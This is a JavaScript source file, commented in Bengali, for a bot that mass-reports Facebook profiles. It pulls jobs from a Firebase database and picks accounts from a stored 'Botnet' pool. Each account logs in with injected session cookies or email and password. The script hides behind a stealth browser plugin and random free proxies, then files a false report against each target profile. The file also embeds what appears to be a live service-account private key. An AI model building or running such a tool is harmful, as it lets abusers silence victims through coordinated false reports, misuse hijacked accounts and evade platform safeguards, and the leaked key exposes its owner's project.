// language: JavaScript (ESM), file: spaam.mjs
import admin from 'firebase-admin';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import axios from 'axios';

puppeteer.use(StealthPlugin());

// ═══════════════════════════════════════════════════════════════
// ১. তোমার ফায়ারবেস সার্ভিস অ্যাকাউন্ট JSON এখানে বসাও
// ═══════════════════════════════════════════════════════════════
const serviceAccount = {
  "type": "service_account",
  "project_id": "cyber-spaam",
  "private_key_id": "fa330152534db6f977ee3f6b191483f0f4a2ead8",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC9kJZKqs073YTU\nDa0hpwI0DeviBy84/FTbpcMkJeFt4TQOOon469yxpfTXmbsxzUr4aSLZPEvCqoNO\nXzygRa3tBkauBD0idFdiUKRW2iOGYJNbzBK1XqcbAcGRrv3cBVShFviqUt3IRUZP\nw0qvo/9+OVPn1ArJtO4MIiqoIQWpSQ1fcbt10SjXYOaWdN5I8YXStKg/1jMEn7lo\n3u4Sx8JaOOD34boOBeq9GHJx6FTFpuVmWXgByDawOpF4ofhdWXFamDV0aDIMvtub\nJ3cwD9vNm3+z/B3cXUh0Qf4ONob1vjA8xHwZpYhg7t4r1KcpuYOwF8F5fmVBMcyB\nhbu3xhHDAgMBAAECggEAFCgCGwljTjjFLWkQ3jGsZc2PJdb+ue/2s+5BvB+9Axp9\nlv+5ePrXWhpb2OrzQR3jmVtQhcnIAnhwAs7UmvQdxMS0kj9IItg9DGqntsZ2HY06\nTfn6iUd5vEDpDK0POCxm7cQMB8xM4cUf705ELD3jZlABMHbW+NCguTCO2Za9S90W\nT0AZjxMgOPqOoxpRK+rbddlNfOpRFaCOe8ef85KGuYjHeZwPE8uCQQFr+V7M3rhy\nJHZzR9Lwu5SII3of8p5KVwKkesbUhB8ku1u2g2tHpd7GQIyatI6q/PKHqbPKLwGa\nopxe16FJBePO6vR0tqyvMOgh7YhB4wXILVBtbC+uLQKBgQDhaqvr7bCv9EhMAbZV\nZ0zJTSGTbUi2pr+0a2+kud0BfryOVAi6wOqsdkj43jCgNIBwnKPMNe6yLZaw21if\n9Z/ED5jo/r4T7njJOCsbgaSZQX3QaPkGvl5cGf17aAae2mBiGvtEt3xHXc6CFUhH\nrkT6SZ47hTnm3rGp/bwRl4ILJQKBgQDXSK7Iox8e0rg4gaSR8mBDfCkHQjPr8DE9\niKm55sbZwz0+189+c9Ljcck2SG8WGi9esbLjdfN4VNHYa/ni8ul9yANXD6dQnVvO\nlsSrgWMoM5oECGUvuY/r6FP0P7+bTEChi0Z9iEChmuRgLK/WC5h4XpUxLZaj2JDz\n8ouSHUlIxwKBgFErZzLyiTAi57Gu4ChKpUTLaG686HUVAG0ITtBjOSjjqSQbMHWH\nKDnn8gjjgWD+5s0mKnlLZmN0tRGEOpqHCPvBng8wQ+PLeGUEu8kQ2uNwyMw2MI30\nGOhTV4qLf+7Nte09yAMLi03rgoQnA7sEDsSNo9PM+nee8xzCSGmRQ/udAoGAbOsL\n6tyEkS6hH42Puns68smtZEu9QyBZeT1cSX6VmnTp1pKPGvX0ezgFSd5pvW/wCWO0\nEtqJHJclN+6hFY46TXXVIsX7q5CBc0raI78pcJxyzpmEwBmM1BjN6OQbx7FTfaee\nOUKnGFvqMTJKn+tr73JC3wemkCywYYuTy4/flN8CgYA7lvijmoXldKdcpww+KtI/\n/5/fukpDu0IRY4fHOxpXPcQBktVqcpDM6NBm02EKZsP8JS22ID+ElXQi6LR3fgDx\nlVxLa6nJ65EFu3rZN38ryHCQSo/AwKsLgpAMn+qVd4b2RJ7iGe49Nt9LR3TGPr7w\n96LMRaKYVHwwaCkObD9ywQ==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@cyber-spaam.iam.gserviceaccount.com",
  "client_id": "116169971207490999086",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40cyber-spaam.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

const DATABASE_URL = "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app";

admin.initializeApp({ 
  credential: admin.credential.cert(serviceAccount),
  databaseURL: DATABASE_URL
});
const db = admin.database();

// ফ্রি প্রক্সি আনা
async function getFreeProxy() {
  try {
    const res = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt', { timeout: 5000 });
    const proxies = res.data.split('\n').filter(p => p.trim() !== '');
    return proxies[Math.floor(Math.random() * proxies.length)];
  } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════
// ২. মূল অ্যাটাক ফাংশন (কুকি এবং পাসওয়ার্ড দুটোই হ্যান্ডেল করবে)
// ═══════════════════════════════════════════════════════════════
async function runAttack(targetUrl, account, proxy) {
  const args = ['--no-sandbox', '--disable-setuid-sandbox', '--disable-blink-features=AutomationControlled'];
  if (proxy) args.push(`--proxy-server=http://${proxy}`);

  const browser = await puppeteer.launch({ headless: "new", args });
  const page = await browser.newPage();
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36');

  try {
    // ১. যদি অ্যাকাউন্টে কুকি থাকে, সরাসরি কুকি সেট করো
    if (account.cookie) {
      console.log(`[BOT] Using Cookie for attack...`);
      const cookies = account.cookie.split('; ').map(c => {
        const [name, value] = c.split('=');
        return { name, value, domain: '.facebook.com' };
      });
      await page.setCookie(...cookies);

    // ২. যদি কুকি না থাকে কিন্তু ইমেইল-পাসওয়ার্ড থাকে, তবে লগইন করো
    } else if (account.email && account.password) {
      console.log(`[BOT] Logging in with Email: ${account.email}`);
      await page.goto('https://m.facebook.com/login', { waitUntil: 'networkidle2', timeout: 30000 });
      
      await page.waitForSelector('#m_login_email', { timeout: 10000 });
      await page.type('#m_login_email', account.email);
      await page.type('#m_login_password', account.password);
      await page.click('button[name="login"]');
      
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 });
      
      if (page.url().includes('checkpoint') || page.url().includes('login')) {
        throw new Error("Login failed / Checkpoint required");
      }
      console.log(`[BOT] Login successful!`);
    } else {
      throw new Error("No valid cookie or credentials found.");
    }

    // ৩. টার্গেট প্রোফাইলে যাওয়া এবং রিপোর্ট করা
    console.log(`[BOT] Attacking Target: ${targetUrl}`);
    await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });

    await page.waitForSelector('div[aria-label="More"], div[aria-label="Actions for this profile"]', { timeout: 15000 });
    await page.click('div[aria-label="More"], div[aria-label="Actions for this profile"]');
    await page.waitForTimeout(2000);

    const items = await page.$$('div[role="menuitem"]');
    for (const item of items) {
      const text = await page.evaluate(el => el.innerText, item);
      if (text.includes('Report') || text.includes('রিপোর্ট')) { await item.click(); break; }
    }
    await page.waitForTimeout(2000);

    const radios = await page.$$('div[role="radio"]');
    if (radios.length > 2) await radios[2].click();
    
    await page.waitForSelector('div[aria-label="Submit"]');
    await page.click('div[aria-label="Submit"]');
    
    console.log(`✅ [SUCCESS] Report sent!`);
    return true;
  } catch (err) {
    console.log(`❌ [FAIL] ${err.message}`);
    return false;
  } finally {
    await browser.close();
  }
}

// ═══════════════════════════════════════════════════════════════
// ৩. মেইন লজিক (একাধিক কাজ হ্যান্ডেল করার জন্য আপডেট করা হলো)
// ═══════════════════════════════════════════════════════════════
async function main() {
  // একবারে সর্বোচ্চ ১০টি পেন্ডিং কাজ খোঁজা
  const jobsSnap = await db.ref('jobs').orderByChild('status').equalTo('pending').limitToFirst(10).once('value');
  
  if (!jobsSnap.exists()) { 
    console.log("No pending jobs."); 
    process.exit(0); 
  }

  const jobs = [];
  jobsSnap.forEach(child => {
    jobs.push({ id: child.key, ...child.val() });
  });

  console.log(`Found ${jobs.length} pending jobs. Starting processing...`);

  // বোটনেট থেকে সব অ্যাকাউন্ট লোড করা
  const accSnap = await db.ref('accounts').once('value');
  const accounts = accSnap.val();
  if (!accounts) { console.log("No accounts in Botnet!"); process.exit(0); }
  const accKeys = Object.keys(accounts);

  // সবগুলো কাজ একের পর এক প্রসেস করা
  for (const job of jobs) {
    console.log(`\n--- Processing Job: ${job.id} for target: ${job.targetUrl} ---`);
    
    await db.ref(`jobs/${job.id}`).update({ status: 'running' });

    // র‍্যান্ডম অ্যাকাউন্ট এবং প্রক্সি নেওয়া
    const randomAccKey = accKeys[Math.floor(Math.random() * accKeys.length)];
    const randomAcc = accounts[randomAccKey];
    const proxy = await getFreeProxy();

    // অ্যাটাক চালানো
    const success = await runAttack(job.targetUrl, randomAcc, proxy);

    if (success) {
      await db.ref(`jobs/${job.id}`).update({ status: 'completed' });
      console.log(`✅ Job ${job.id} Completed!`);
    } else {
      await db.ref(`jobs/${job.id}`).update({ status: 'failed' });
      // ফেইল করলে অ্যাকাউন্টটি ডিলিট করা
      await db.ref(`accounts/${randomAccKey}`).remove();
      console.log(`❌ Job ${job.id} Failed.`);
    }

    // প্রতিটি কাজের মাঝে ৫ সেকেন্ড বিরতি
    await new Promise(r => setTimeout(r, 5000));
  }

  console.log("\n🏁 All pending jobs processed.");
}

main();
